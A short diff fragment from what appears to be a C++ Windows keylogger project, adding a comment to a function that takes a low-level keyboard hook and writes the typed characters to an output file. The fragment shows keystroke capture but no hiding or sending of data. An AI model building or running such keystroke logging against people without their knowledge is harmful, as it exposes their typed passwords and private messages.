@@ -28,6 +28,7 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
     }
     else
     {
+        // Write the respective unicode characters of the converted kbd hook.
         out_file << keyboard::kbd_to_unicode(kbd_hook);
     }
 
